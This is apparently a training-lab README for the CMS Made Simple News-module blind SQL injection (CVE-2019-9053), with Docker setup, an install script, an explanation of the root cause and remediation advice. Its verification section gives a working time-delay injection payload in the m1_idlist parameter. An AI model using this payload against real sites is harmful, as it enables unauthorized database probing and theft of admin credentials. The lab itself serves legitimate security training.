# CMS Made Simple Time-Based Blind SQL Injection (CVE-2019-9053)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **CMS Made Simple Time-Based Blind SQL Injection (CVE-2019-9053)**.

- **Target Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/cmsms_sqli_cve_2019_9053`
- **Default Port(s)**: `8259:80`
- **CLI Shortcut**: `./lab start cmsms-blind-sqli`

---

## Architecture & Service Map

- **Web Container Name**: `cyberlab_02_cmsms_app` (`vulhub/cmsms:2.2.9.1`)
  - Exposed Port: `8259:80`
- **Database Container Name**: `cyberlab_02_cmsms_db` (`mysql:5.7`)
  - Database Hostname: `db`
  - Database Name: `cmsms`
  - Database Credentials: `root` / `root`
- **Network Mode**: Bridge (Isolated Docker network)
- **Pull Policy**: `missing`

---

## Initial Setup & Environment Initialization

When the environment is brought up with `docker compose up -d`, CMS Made Simple serves the installation wizard (`install.php`):

1. Browse to `http://localhost:8259/install.php`.
2. Follow the setup wizard using the following database settings:
   - **Database Host**: `db`
   - **Database Name**: `cmsms`
   - **Database Username**: `root`
   - **Database Password**: `root`
3. Complete the admin account configuration to finalize the site and module installation.

Alternatively, the installation can be automated via the following Python snippet:

```bash
python3 -c "
import requests, re
from urllib.parse import urljoin

base = 'http://localhost:8259/install.php/index.php'
s = requests.Session()
r = s.get(base)
m = re.search(r'<form.*?action=[\"\'](.*?)[\"\']', r.text)
r = s.post(urljoin(base, m.group(1)), data={'lang': 'en_US', 'verbose': '0', 'next': 'Next ->'})
m = re.search(r'<form.*?action=[\"\'](.*?)[\"\']', r.text)
r = s.post(urljoin(base, m.group(1)), data={'install': 'Install'})
m = re.search(r'href=[\"\'](/install\.php/index\.php\?[^\"\']+)[\"\'].*?Next', r.text)
r = s.get(urljoin(base, m.group(1)))
m = re.search(r'<form.*?action=[\"\'](.*?)[\"\']', r.text)
r = s.post(urljoin(base, m.group(1)), data={'dbhost': 'db', 'dbname': 'cmsms', 'dbuser': 'root', 'dbpass': 'root', 'timezone': 'UTC', 'next': 'Next ->'})
m = re.search(r'<form.*?action=[\"\'](.*?)[\"\']', r.text)
r = s.post(urljoin(base, m.group(1)), data={'username': 'admin', 'emailaddr': 'admin@cyberlab.local', 'password': 'password123', 'repeatpw': 'password123', 'next': 'Next ->'})
m = re.search(r'<form.*?action=[\"\'](.*?)[\"\']', r.text)
r = s.post(urljoin(base, m.group(1)), data={'sitename': 'CMSMS Lab', 'languages[]': 'en_US', 'next': 'Next ->'})
m = re.search(r'href=[\"\'](/install\.php/index\.php\?[^\"\']+)[\"\'].*?Next', r.text)
r = s.get(urljoin(base, m.group(1)))
m = re.search(r'href=[\"\'](/install\.php/index\.php\?[^\"\']+)[\"\'].*?Next', r.text)
r = s.get(urljoin(base, m.group(1)))
print('Installation complete!')
"
```

---

## Vulnerability Mechanics

### Technical Root Cause

In CMS Made Simple (CMSMS) versions prior to 2.2.10 (tested on 2.2.9.1), an unauthenticated time-based blind SQL injection flaw exists in the **News** module. Input passed to the `m1_idlist` parameter via `/moduleinterface.php?mact=News,m1_,default,0` is concatenated directly into SQL queries without proper sanitization or parameter binding.

Because query results are not directly reflected in HTTP responses, attackers utilize time delays (`SLEEP()`, `BENCHMARK()`) to systematically infer data character-by-character. This allows unauthenticated remote attackers to dump the password salt (`sitepref_value` where `sitepref_name = 'sitemask'`), administrator usernames, email addresses, and MD5 password hashes from `cms_users`.

---

## Verification Commands

### 1. HTTP Endpoint Check

Verify that the CMS Made Simple application is online and responds with HTTP 200:

```bash
curl -I -s http://localhost:8259/
```

### 2. Baseline Response Time (News Module)

Measure normal response time against the vulnerable News module endpoint (typically < 0.1s):

```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\nTime Total: %{time_total}s\n" \
  "http://localhost:8259/moduleinterface.php?mact=News,m1_,default,0"
```

### 3. Blind SQL Injection Verification (`SLEEP(2)`)

Inject a time-delay payload into the `m1_idlist` parameter. The response time will increase by approximately 2 seconds:

```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}\nTime Total: %{time_total}s\n" \
  "http://localhost:8259/moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(2))+--+"
```

---

## Defensive Remediation & Hardening

1. **Upgrade**: Update CMS Made Simple to version 2.2.10 or higher.
2. **Prepared Statements**: Ensure all database queries utilize prepared statements and parameterized inputs instead of raw string concatenation.
3. **WAF Protection**: Deploy a Web Application Firewall rule inspecting module parameters (such as `m1_idlist`) for SQL injection keywords and timing functions.

---

## References & Advisories

- **Official Vulhub Repository**: [Vulhub CMSMS CVE-2019-9053](https://github.com/vulhub/vulhub/tree/master/cmsms/CVE-2019-9053)
- **NVD Advisory**: [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)
- **Exploit-DB PoC**: [Exploit-DB 46635](https://www.exploit-db.com/exploits/46635)
- **Video Walkthrough**: [CVE-2019-9053 Walkthrough | TryHackMe Simple CTF](https://www.youtube.com/watch?v=kad8ZrdgW8U)
